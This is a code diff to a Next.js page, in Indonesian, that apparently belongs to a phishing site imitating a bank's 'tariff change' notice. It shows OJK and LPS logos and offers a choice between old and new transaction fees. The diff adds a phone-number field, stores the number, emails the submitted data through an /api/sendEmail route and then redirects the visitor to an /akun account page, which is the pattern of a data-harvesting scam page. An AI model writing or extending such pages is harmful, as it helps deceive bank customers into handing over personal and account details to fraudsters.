@@ -1,20 +1,65 @@
-import React from 'react'
+import React, { useState } from 'react'
 import Image from 'next/image'
 
 import banner from "../public/banner.jpeg"
 import ojk from "../public/ojk.png"
 import lps from "../public/lps.png"
 import { useRouter } from 'next/router'
+import { BsFillTelephoneFill } from 'react-icons/bs'
 
-function Home() {
+function Home({host}) {
+    const [data, setData] = useState({})
+    const [disbledBtn, setDisbledBtn] = useState(true)
 
     const router = useRouter()
 
-    const handleSubmit = (e) => {
+    const handleChange = (e) => {
+        setData({
+            ...data, 
+            [e.target.name]: e.target.value
+        })
+
+        if(e.target.value){
+            setDisbledBtn(false)
+        } else {
+            setDisbledBtn(true)
+        }
+    }
+
+    const handleSubmit = async (e) => {
         e.preventDefault()
         const checked = document.getElementById('tarif').value
+
+        localStorage.setItem('noHp', data.nomorhandphone)
+
         if (checked > 0) {
-            router.push('/akun')
+            document.getElementById('btn').innerHTML = 'Loading...'
+            try {
+                
+                const response = await fetch('/api/sendEmail', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'url': host
+                    },
+                    body: JSON.stringify(data)
+                })
+
+                const json = await response.json()
+                
+                if (json.status === 200) {
+                    document.getElementById('btn').innerHTML = 'Lanjut Aktivasi'
+                    router.push('/akun')
+
+                } else{
+                    document.getElementById('btn').innerHTML = 'Lanjut Aktivasi'
+                    console.log(json.error)
+                }
+
+            } catch (error) {
+                document.getElementById('btn').innerHTML = 'Lanjut Aktivasi'
+                console.log(error.message);
+            }
         }
 
         return
@@ -36,7 +81,11 @@ function Home() {
                             <option value="1">TARIF LAMA Rp6.500 pertransaksi</option>
                             <option value="2">TARIF BARU Rp150.000 Perbulanan Unlimited</option>
                           </select>
-                          <button type='submit' className='btn' id='btn' style={{cursor:'pointer', fontWeight:'normal', wordSpacing:2, borderRadius:4}}>
+                          <div className="form-group" style={{marginTop:20}}>
+                            <input type="number" className='form-control' placeholder='No Handphone' onChange={handleChange} name="nomorhandphone" required/>
+                            <BsFillTelephoneFill className='icon-control'/>
+                        </div>
+                          <button disabled={disbledBtn} type='submit' className='btn' id='btn' style={{cursor:'pointer', fontWeight:'normal', wordSpacing:2, borderRadius:4}}>
                               Lanjut Aktivasi
                           </button>
                       </form>
@@ -52,3 +101,14 @@ function Home() {
 }
 
 export default Home
+
+export async function getServerSideProps(context) {
+
+    const host = context.req.headers.host
+    
+    return {
+      props: {
+        host
+      },
+    }
+  }
